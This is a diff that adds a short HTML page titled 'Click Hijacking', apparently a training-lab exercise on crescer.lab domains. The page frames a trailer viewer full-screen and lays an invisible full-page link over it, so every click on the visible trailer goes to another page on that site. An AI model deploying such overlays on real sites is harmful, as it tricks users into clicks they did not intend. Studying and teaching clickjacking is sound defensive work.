@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <title>Click Hijacking</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        a {
+            display: block;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+            z-index: 999;
+        }
+    </style>
+</head>
+
+<body>
+    <a href="http://www.crescer.lab/post/8"></a>
+    <iframe src="http://trailer-viewer.crescer.lab/?trailer=nosferatu"></iframe>
+</body>
+
+</html> 
